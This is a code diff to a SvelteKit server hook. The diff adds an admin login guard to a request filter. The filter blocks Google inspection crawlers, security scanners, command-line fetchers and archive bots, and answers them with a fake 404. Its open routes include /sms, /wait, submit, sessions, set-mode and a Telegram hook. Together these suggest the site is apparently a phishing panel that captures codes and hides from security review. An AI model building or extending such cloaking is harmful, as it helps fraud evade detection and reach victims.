@@ -11,6 +11,7 @@
  */
 
 import { inc } from '$lib/stats.js';
+import { isAdminAuthed } from '$lib/auth.js';
 
 // ---------- UA patterns ----------
 const BOT_UA = /(googlebot|adsbot-google|mediapartners-google|google-inspectiontool|google-site-verification|google-read-aloud|googleother|googleweblight|apis-google|feedfetcher-google|google favicon|chrome-lighthouse|google page speed|googleimageproxy|bot|crawl|spider|scan|slurp|fetch|curl|wget|python-requests|python\/|go-http|okhttp|httpclient|java\/|axios|node-fetch|got\/|undici|lighthouse|headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver|pagespeed|gtmetrix|pingdom|uptimerobot|monitoring|statuscake|newrelic|datadog|site24x7|seobility|semrush|ahrefs|majestic|mj12|dotbot|petalbot|yandex|bingpreview|applebot|facebot|facebookexternalhit|whatsapp|telegrambot|discordbot|skypeuri|linkedinbot|twitterbot|slackbot|embedly|vkshare|w3c_validator|feedburner|rss|newsgator|postman|insomnia|apachebench|ab\/|siege|hey\/|vegeta|k6|locust|gatling|masscan|zgrab|nuclei|nikto|nmap|sqlmap|acunetix|nessus|openvas|burpsuite|zaproxy|wpscan|gobuster|dirbuster|ffuf|feroxbuster|shodan|censys|binaryedge|netcraft|archive\.org|wayback|httrack|heritrix|scrapy|colly|winhttp|libwww|lwp|mechanize|requests)/i;
@@ -56,13 +57,20 @@ const BAD_ASNS = new Set([
 // ---------- Always-allow paths ----------
 const ALLOW_PATHS = [
   /^\/admin(\/|$)/,
-  /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session)(\/|$)?/,
+  /^\/login(\/|$)/,
+  /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session|admin-login)(\/|$)?/,
   /^\/wait(\.html)?(\/|$)/,
   /^\/sms(\.html)?(\/|$)/,
   /^\/img\//,
   /^\/css\//,
   /^\/js\//,
   /^\/favicon/
+];
+
+// Admin-protected paths (need valid admin_token cookie)
+const ADMIN_PATHS = [
+  /^\/admin(\/|$)/,
+  /^\/api\/(sessions|set-mode|delete-session)(\/|$)?/
 ];
 
 // ---------- ipapi.co fallback cache ----------
@@ -87,10 +95,10 @@ async function isBadIP(ip) {
 }
 
 function blockResponse() {
-  return new Response(
-    '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>',
-    { status: 404, headers: { 'Content-Type': 'text/html; charset=utf-8' } }
-  );
+  return new Response('', {
+    status: 404,
+    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
+  });
 }
 
 function block(platform) {
@@ -100,10 +108,25 @@ function block(platform) {
 
 /** @type {import('@sveltejs/kit').Handle} */
 export async function handle({ event, resolve }) {
-  const { request, url, getClientAddress, platform } = event;
+  const { request, url, getClientAddress, platform, cookies } = event;
   const path = url.pathname;
 
-  // 0. Always-allowed paths
+  // Admin guard runs FIRST (before bot blocker) so legitimate admin always reaches login
+  if (ADMIN_PATHS.some((re) => re.test(path))) {
+    const token = cookies.get('admin_token');
+    const authed = await isAdminAuthed(platform, token);
+    if (!authed) {
+      // For HTML page requests, redirect to login. For API, return 401.
+      const accept = request.headers.get('accept') || '';
+      if (accept.includes('text/html')) {
+        return new Response('', { status: 302, headers: { Location: '/login' } });
+      }
+      return new Response('unauthorized', { status: 401 });
+    }
+    return resolve(event);
+  }
+
+  // 0. Always-allowed paths (login page, public APIs, static assets)
   if (ALLOW_PATHS.some((re) => re.test(path))) return resolve(event);
 
   const cf = platform?.cf || {};
